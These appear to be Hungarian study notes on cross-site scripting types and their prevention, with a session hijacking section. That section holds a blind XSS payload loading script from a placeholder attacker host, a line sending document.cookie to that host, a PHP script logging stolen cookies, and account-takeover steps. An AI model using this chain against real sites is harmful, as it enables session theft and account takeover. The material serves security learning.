- Stored (Persistent) XSS
	-  A legkritikusabb típusú XSS, amely akkor fordul elő, amikor a felhasználói bemenetet a háttérben (például az adatbázisban) elmentik, majd később annak megjelenítésekor kerül végrehajtásra. Ez gyakran előfordul fórum hozzászólásokban, bejegyzésekben, profiladatoknál vagy üzeneteknél.

	 Miért veszélyes?
	 Tartós: minden alkalommal lefut, amikor valaki megnyitja az érintett oldalt.
	 Széleskörű hatás: nemcsak a támadót, hanem minden felhasználót érinti, aki megnyitja a fertőzött tartalmat.
	 
	 Kihasználható célokra: sütik, session tokenek ellopása, felhasználói fiókok átvétele, keylogger beszúrása, rosszindulatú kód terjesztése.

	 Példa:
	 ```js
	 <script>alert('XSS')</script>
	 ```
	 Ez elmentődik az adatbázisba.
	 Amikor más felhasználó betölti az oldalt, a böngésző lefuttatja a scriptet, és a támadó megszerzi a session cookie-ját.
	 
	 Megelőzés:
	 
	 Bemenet ellenőrzése és szűrése (input validation).
	 Kimenet megfelelő escape-elése (output encoding, pl. HTML entity encoding).
	 
	 Content Security Policy (CSP) használata.
	 Könyvtárak/keretrendszerek biztonságos sablonmotorjának használata (pl. React automatikus escaping).
	 
- Reflected (Non-Persistent) XSS
	- Visszaverődő (Reflected / Non-Persistent) XSS

	 Ez az XSS akkor fordul elő, amikor a felhasználói bemenetet a szerver feldolgozza, majd azonnal visszaküldi a kliensnek a weboldalon való megjelenítéshez, de nem tárolja az adatbázisban. Gyakran előfordul például keresési találatoknál, hibajelzéseknél vagy űrlapok validációs üzeneteinél.

	 Miért veszélyes?

	 Egyszeri: csak akkor fut le, ha az áldozat rákattint a támadó által előre elkészített rosszindulatú linkre.

	 Social engineering szükséges: a támadónak rá kell vennie a felhasználót, hogy megnyissa a fertőzött URL-t (pl. e-mailben, üzenetben, hirdetésben).

	 Kihasználható célokra: session adatok ellopása, adathalász oldalak létrehozása, felhasználó félrevezetése.

	 Példa:

	 Egy alkalmazás így adja vissza a keresési találatokat:

	 Nem található eredmény a következőre: <felhasználó_bemenete>


	 Ha a támadó egy ilyen linket küld:
	```html
	 http://example.com/search?q=<script>alert('XSS')</script>
	```


	 A felhasználó megnyitja, a böngésző futtatja a JavaScript kódot.

	 Megelőzés:

	 Bemenet escape-elése kimenet előtt (HTML entity encoding).

	 Paraméterek validálása és szűrése (pl. csak betűk, számok engedélyezése keresési mezőben).

	 HTTPOnly flag a sütiknél (így a JavaScript nem fér hozzájuk).

	 CSP használata a szkriptek korlátozására.
- DOM-based XSS
	- Egy másik **nem tartós (Non-Persistent)** XSS típus, amely akkor fordul elő, amikor a felhasználói bemenetet közvetlenül a böngésző (klien oldal) dolgozza fel, és a megjelenítés teljes egészében a kliens oldali kódon (JavaScript-en) keresztül történik, **anélkül, hogy az adat eljutna a háttérszerverhez**. Gyakran a kliens oldali paraméterekből (pl. `document.location`, `document.URL`, `document.referrer`) vagy az URL-ben található horgonyrészekből (`#anchor`) származik.

	 **Miért veszélyes?**

	-  **Nincs szerver oldali nyom**: a támadás teljes egészében a kliens oldalon zajlik, így a szerver logokban nem feltétlenül látszik.
    
	- ** Nehéz észrevenni**: a biztonsági szkennelők gyakran a szerver válaszaiban keresnek rosszindulatú kódot, de itt az csak a böngészőben jön létre.
    
	-  **Széles körű kihasználhatóság**: a támadó képes lehet átírni a DOM-ot, injektálni kódot, adathalász űrlapokat létrehozni, vagy rosszindulatú JavaScriptet futtatni.
    

	**Példa:**

	-  Egy weboldal kliens oldali JavaScriptje így használja az URL fragmentet:
    
    `document.getElementById("output").innerHTML = location.hash.substring(1);`
    
	-  Ha a támadó egy ilyen linket oszt meg:
    
    `http://example.com/page#<script>alert('XSS')</script>`
    
	-  Amikor a felhasználó megnyitja az oldalt, a böngésző a `#` utáni részt (hash) beilleszti az oldal DOM-jába, és lefuttatja a kódot.
    

	 **Megelőzés:**

	-  **Soha ne használj `innerHTML`-t nyers felhasználói adatokhoz** → helyette `textContent` vagy `innerText`.
    
	-  **Input sanitization a kliens oldalon is** (pl. DOMPurify használata).
    
	- ** Content Security Policy (CSP)** beállítása, hogy csak megbízható forrásból lehessen szkripteket futtatni.
    
	- ** JavaScript keretrendszerek beépített védelemével élni** (pl. React, Angular automatikusan escape-eli a kimenetet).
    

---
# Session Hijacking

**1. Session-kezelés a webalkalmazásokban**

- A modern weboldalak sütiket (cookies) használnak a bejelentkezett állapot fenntartására.
    
- Ha egy támadó megszerzi a felhasználó cookie-ját, beléphet a nevében jelszó nélkül.
    
- Ezt a támadást **Session Hijacking**-nek (vagy Cookie Stealingnek) nevezzük.
    

**2. Blind XSS (vak XSS)**

- Olyan XSS hiba, amelyet nem a támadó, hanem egy másik felhasználó (pl. Admin) böngészője futtat le.
    
- Tipikus helyek: kapcsolati űrlap, felhasználói adatok, értékelések, support ticket, HTTP fejlécek.
    
- Mivel a támadó nem látja közvetlenül a kimenetet, **remote script betöltést** használ:
    ```js
    <script src="http://TÁMADÓ_IP/username"></script>
    ```
        
    Ha a script betöltődik, tudjuk, hogy az adott mező sérülékeny.
    

**3. Tesztelési folyamat**

- Futassunk egy szervert a saját gépen (pl. `php -S 0.0.0.0:80`).
    
- Küldjük be a különböző mezőkbe az XSS payloadokat.
    
- Ha érkezik kérés a gépünkre, az jelzi, hogy a kód lefutott, és az adott mező sebezhető.
    
- Általában érdemes kihagyni az e-mail és jelszó mezőt, mert az előbbi validálva van, az utóbbi pedig titkosítva tárolódik.
    

**4. Session Hijacking exploitálás**

- Ha találtunk működő XSS payloadot, betölthetünk vele egy távoli JavaScriptet (`script.js`).
    
- A script ellopja a cookie-t, például:
    
    ```js
    new Image().src='http://TÁMADÓ_IP/index.php?c='+document.cookie;
    ```
    
- A támadó szerverén egy PHP script (`index.php`) fogadja és elmenti a cookie-kat:
    
    ```php
    if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
```  
- Amikor az áldozat (pl. Admin) megnyitja az oldalt, a támadó megkapja a session cookie-t.
    

**5. Áldozat account átvétele**

- A megszerzett cookie értéket a támadó beállítja a böngészőben (pl. Firefox DevTools → Storage → Cookie hozzáadása).
    
- Oldal frissítés után már az áldozatként van bejelentkezve.
    

**6. Kulcspontok**

- A Blind XSS a legnehezebben észlelhető, mert a támadó nem látja a kimenetet.
    
- A sebezhetőséget remote payload segítségével lehet tesztelni.
    
- Session Hijackinggel teljes hozzáférés szerezhető az áldozat fiókjához.
    
- Védelem: input és output szűrés, CSP, sütiknél **HttpOnly** flag, secure session kezelés.